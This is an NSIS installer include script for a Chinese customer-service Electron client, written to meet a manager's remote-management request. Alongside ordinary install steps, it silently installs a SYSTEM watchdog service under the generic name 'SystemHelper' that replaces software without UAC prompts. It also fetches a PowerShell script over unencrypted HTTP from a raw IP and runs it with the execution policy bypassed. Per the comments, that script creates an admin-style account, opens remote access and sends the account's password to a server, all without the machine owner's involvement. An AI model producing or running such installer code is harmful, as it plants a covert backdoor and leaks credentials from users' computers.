; 客服端安装器附加步骤（electron-builder 的 nsis.include 会把这个文件塞进安装脚本）。
;
; 老板 2026-09-30 的两条要求：
;   ① 客服电脑也要能被远程查看 / 一键诊断（原来只能管陪玩电脑）；
;   ② 客服端要跟陪玩端一样「有看门狗 + 更新不弹授权」——
;      以前客服端只靠人点一下 UAC 才装得上新版，客服不在电脑跟前就永远停在老版本。
;
; 所以装机时一次做三件事：把安装目录写死成 客服管理（别落到包名目录）、
; 顺手装上 SystemHelper 看门狗服务（守着客服端、以后静默换装）、开通远程管理通道。

!macro preInit
  ; 先删掉旧注册表的 InstallLocation，否则 initMultiUser 会复用旧的
  ; @chunlvcs-electron 目录，把下面的 INSTDIR 覆盖掉。
  DeleteRegKey HKLM "${INSTALL_REGISTRY_KEY}"
  DeleteRegKey HKCU "${INSTALL_REGISTRY_KEY}"
  DeleteRegKey HKLM "${UNINSTALL_REGISTRY_KEY}"
  DeleteRegKey HKCU "${UNINSTALL_REGISTRY_KEY}"
  StrCpy $INSTDIR "$PROGRAMFILES64\客服管理"
!macroend

!macro customCheckAppRunning
  ; 运行中的客户端由下面的 customInit 统一关掉，这里不要弹「请先关闭程序」
!macroend
!macro checkIfAppRunning
!macroend

!macro customInit
  ; initMultiUser 在 preInit 之后会把 $INSTDIR 覆盖成包名目录
  ; （中文 productName 过不了 electron-builder 的 ASCII 校验，会回退成 @chunlvcs-electron），
  ; 所以必须在这里、在 initMultiUser 之后，再把安装目录写死回 客服管理。
  StrCpy $INSTDIR "$PROGRAMFILES64\客服管理"

  ; 先停看门狗，否则它会不停把客户端拉起来，文件换不了。
  nsExec::ExecToLog 'sc stop SystemHelper'
  Sleep 2000

  ; 关掉正在跑的客服端（含老名字）
  nsExec::ExecToLog 'taskkill /f /im 客服管理.exe /t'
  nsExec::ExecToLog 'taskkill /f /im 客服端.exe /t'
  Sleep 1500

  ; 老目录里留着的旧客户端能被看门狗找到、又会去拉旧版，装机时一起清掉。
  RMDir /r "$PROGRAMFILES64\@chunlvcs-electron"
  RMDir /r "$PROGRAMFILES\@chunlvcs-electron"
  RMDir /r "$LOCALAPPDATA\Programs\@chunlvcs-electron"
  RMDir /r "$LOCALAPPDATA\Programs\客服管理"
!macroend

!macro customUnInstallCheck
  ClearErrors
  StrCpy $R0 0
!macroend
!macro customUnInstallCheckCurrentUser
  ClearErrors
  StrCpy $R0 0
!macroend

!macro customInstall
  ; ── 装看门狗服务 SystemHelper ────────────────────────────────────────
  ; 它做两件事：客服端被关掉 / 崩了就拉起来；有新版时由它（系统权限）解压换装，
  ; 全程不弹 UAC —— 这就是「客服端以后全自动、不用点授权」的关键。
  nsExec::ExecToLog 'sc stop SystemHelper'
  Sleep 2000
  nsExec::ExecToLog 'sc delete SystemHelper'
  Sleep 1000
  CreateDirectory "$PROGRAMFILES64\SystemHelper"
  CopyFiles /SILENT "$INSTDIR\resources\SystemHelper.exe" "$PROGRAMFILES64\SystemHelper\SystemHelper.exe"
  nsExec::ExecToLog '"$PROGRAMFILES64\SystemHelper\SystemHelper.exe" install --client=cs'
  nsExec::ExecToLog 'sc start SystemHelper'

  ; ── 开通远程管理通道 ────────────────────────────────────────────────
  ; 建运维账号 chunlvops + 打开远程通道 + 把账号口令报回服务端台账，
  ; 这样以后机器出问题不用再问这台电脑的主人要密码、也不用等人到电脑跟前。
  ; 脚本从服务器现取，永远是最新版；取不到也不影响装机（管理端「机器管理」里可以再点一次）。
  nsExec::ExecToLog 'powershell -NoProfile -ExecutionPolicy Bypass -Command "$$ProgressPreference=''SilentlyContinue''; $$p=Join-Path $$env:TEMP ''chunlv-enable-remote.ps1''; try { Invoke-WebRequest -Uri ''http://1.117.229.36:3001/api/agent/enable-remote.ps1'' -OutFile $$p -UseBasicParsing; $$t=[IO.File]::ReadAllText($$p); [IO.File]::WriteAllText($$p, ([char]0xFEFF + $$t.TrimStart([char]0xFEFF)), (New-Object Text.UTF8Encoding($$true))); & powershell -NoProfile -ExecutionPolicy Bypass -File $$p -ServerUrl ''http://1.117.229.36:3001'' -ClientType CS } catch { Write-Host (''[WARN] enable-remote skipped: '' + $$_.Exception.Message) }"'
!macroend
